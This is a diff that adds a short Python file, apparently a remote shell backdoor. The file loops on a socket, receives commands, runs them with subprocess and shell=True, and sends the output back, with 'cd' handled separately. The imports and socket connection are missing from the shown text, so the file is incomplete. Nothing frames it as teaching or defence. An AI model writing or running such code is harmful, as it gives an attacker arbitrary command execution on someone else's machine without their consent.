@@ -1,0 +1,35 @@
+
+
+r = "\033[;31m"
+g = "\033[;32m"
+y = "\033[;33m"
+b = "\033[;34m"
+e = "\033[;0m"
+
+def n():
+ while True:
+  try:
+    cmd = s.recv(1024)
+    if cmd[:2] == 'cd':
+     os.chdir(cmd[3:])
+     dir = os.getcwd()
+     s.sendall(g+'Ls'+e)
+    else:
+     results = subprocess.Popen(cmd, shell=True,
+               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+               stdin=subprocess.PIPE)
+     results = results.stdout.read() + results.stderr.read()
+
+     s.sendall('\n'+results)
+     time.sleep(3)
+     print(g+"Tunggu..."+e)
+     
+  except KeyboardInterrupt:
+   sys.exit()
+  except socket.error:
+   sys.exit()
+   
+
+
+if __name__ == "__main__":
+ n()
